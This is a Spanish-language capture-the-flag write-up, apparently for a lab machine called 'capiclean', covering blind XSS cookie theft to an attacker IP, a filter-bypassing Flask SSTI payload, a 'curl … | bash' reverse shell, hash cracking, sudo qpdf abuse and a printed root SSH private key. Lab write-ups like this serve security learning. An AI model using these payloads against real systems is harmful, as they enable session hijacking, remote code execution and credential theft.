PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Añadimos 'capiclean.htb' al /etc/hosts

-Nos vamos a /quote dónde podemos mandar un formulario, Interceptamos la petición:
	-Tenemos los siguientes campos:
		POST /sendMessage HTTP/1.1
		Host: capiclean.htb
		service=Carpet+Cleaning&service=Tile+%26+Grout&email=test%40gmail.com

-Probamos a inyectar código js y a ver si nos llega la conexión a nuestro servidor:
	POST /sendMessage HTTP/1.1
	Host: capiclean.htb
	service=<script+src="http://10.10.14.25/"></script>&service=Tile+%26+Grout&email=test%40gmail.com
	-Abrimos el servidor:
		-python3 -m http.server 80
			"GET / HTTP/1.1" 200 -
			(FUNCIONA!! , Recibimos la conexión)

## Cookie Hijacking

-Vamos a utilizar el siguiente Payload:
	-<img src=q onerror="new Image().src='http://10.10.14.25/?c='+document.cookie">

-Lo vamos a URL Encodear para que no haya problemas:
	POST /sendMessage HTTP/1.1
	Host: capiclean.htb
service=%3c%69%6d%67%20%73%72%63%3d%71%20%6f%6e%65%72%72%6f%72%3d%22%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%32%35%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%22%3e&service=Tile+%26+Grout&email=test%40gmail.com

-Iniciamos servidor y esperamos la conexión:
	-python3 -m http.server 80
		"GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.aCITuw.7iWD2TG1wQ7j3thPReGa6XSEW14 HTTP/1.1"
		(HEMOS ROBADO UNA COOKIE!!)

-La extensión EditThisCookie no nos pilla ninguna cookie, en Storage tampoco vemos nada.

-Aunque no haya nada, le damos al + en Storage y creamos una nueva instancia:
	Name        Value
	session       La cookie robada

-Recargamos y no pasa nada, pero si nos vamos a /dasboard nos carga la web como si fuéramos Admin. Vemos cosas que antes no veíamos.

-Nos vamos a la siguiente ruta, copiamos el link e interceptamos la petición en 'Submit':
	-http://capiclean.htb/QRGenerator

-Tenemos los siguientes campos:
	invoice_id={{7*7}}&form_type=scannable_invoice&qr_link=http%3A%2F%2Fcapiclean.htb%2Fstatic%2Fqr_code%2Fqr_code_9753024696.png

-Ya que el Servidor Web es un Flask, vamos a probar un Server **Side template Injection (SSTI)**
	-Modificamos el parámetro 'qr_link':
		invoice_id={{7*7}}&form_type=scannable_invoice&qr_link=![[Pasted image 20250512191429.png]]

-Respuesta del Servidor: img src="data:image/png;base64,49" 
	-LO HA INTERPRETADO!!

-Buscamos un Payload que nos permita ejecutar comandos:
	-Probamos muchos pero el único que se salta todos los filtros es este:
		qr_link={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
			img src="data:image/png;base64,uid=33(www-data) **gid=33(www-data) groups=33(www-data)**
		(Lo encontramos en PayloadsAllThethings , en la sección de SSTI Filter Bypass)

-NOTA: No deja mandar una RS directamente, he creado un archivo exploit.sh con la típica RS de bash y le he hecho una petición con Curl

-Nos mandamos la RS:
	-qr_link={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl http://10.10.14.25/exploit.sh | bash')|attr('read')()}}
		**www-data@iclean:/opt/app$ whoami**
			**www-data**

## Escalada de Privilegios

-En /opt/app/app.py encontramos credenciales para la BD:
	'user': 'iclean',
    'password': 'pxCsmnGLckUb',

-Nos conectamos a mysql y obtenemos el hash del usuario 'consuela':
	consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa

-Lo rompemos con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 hash.txt
		simple and clean (?)

-Pivotamos al usuario consuela:
	-su consuela
	-Pasword: simple and clean
		consuela@iclean:/$ whoami
			consuela

-sudo -l:
	(ALL) /usr/bin/qpdf

### Cómo explotar /usr/bin/qpdf

-sudo qpdf --empty --add-attachment /root/root.txt -- /tmp/prueba.txt

-Abrimos servidor y nos descargamos el archivo en nuestra máquina local:
	-wget http://IP/prueba.txt
	-mv prueba.txt prueba.pdf
	-open prueba.pdf
	-Pinchamos en la pestaña 'Views' --> Pinchamos en la cagita y elegimos Attachments
		-Aquí veremos el root.txt

-Para conseguir una Shell como root hacemos el mismo proceso pero trayéndonos la id_rsa de root

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----

root@iclean:~# whoami
	root



